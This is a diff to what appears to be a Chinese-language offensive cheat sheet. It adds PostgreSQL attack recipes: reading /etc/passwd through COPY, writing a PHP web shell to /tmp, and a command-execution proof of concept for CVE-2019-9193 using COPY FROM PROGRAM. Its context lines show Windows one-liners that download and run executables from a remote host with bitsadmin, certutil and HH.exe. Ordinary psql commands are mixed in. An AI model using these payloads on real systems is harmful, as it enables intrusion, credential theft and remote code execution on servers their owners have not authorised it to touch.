@@ -295,6 +295,65 @@ cmd.exe /c bitsadmin /transfer f370 http://x.x.x.x/as %APPDATA%\f370.exe&%APPDAT
 certutil.exe -urlcache -split -f https://x.x.x.x/version.txt   file.txt
 HH.exe http://x.x.x.x/test.exe c:\\test.exe	//适用于sqltools
 ```
+# postgresql命令执行
+使用数据库获取系统信息
+```
+drop table pwn;
+create table pwn(t TEXT);
+copy pwn from '/etc/passwd';
+select *from pwn limit 1 offset 0;
+drop table pwn;
+```
+使用数据库写文件
+```
+drop table pwn;
+create table pwn (t TEXT);
+insert into pwn(t) values ('<?php @system("$_GET[cmd]");?>');
+select * from pwn;
+copy pwn(t) to  '/tmp/cmd.php';
+drop table pwn;
+或
+copy  (select '<?php phpinfo();?>') to '/tmp/1.php';
+```
+## PostgreSQL常用操作命令
+```
+sudo -u postgres psql
+psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432
+
+\password           设置密码。
+\q                  退出。
+\h                  查看SQL命令的解释，比如\h select。
+\?                  查看psql命令列表。
+\l                  列出所有数据库。
+\c [database_name]  连接其他数据库。
+\d                  列出当前数据库的所有表格。
+\d [table_name]     列出某一张表格的结构。
+\du                 列出所有用户。
+\e                  打开文本编辑器。
+\conninfo           列出当前数据库和连接的信息。
+SELECT first_name FROM customer;//查询表指定字段
+SELECT id,user,pass FROM customer;	//查询表多个指定字段
+COPY (select * from users) to '/tmp/users.csv' with csv header; //导出表
+```
+
+## PostgreSQL高权限命令执行漏洞（CVE-2019-9193）
+
+漏洞攻击POC：
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+注意：命令中的任何单引号都必须通过双引号来转义它们。比如想执行下面命令:
+```
+echo 'hello';
+```
+你需要将它放在单引号内，然后用双引号替换所有单引号：
+```
+'echo "hello";'
+```
+
 # mysql
 ## mysqldump命令
 ```
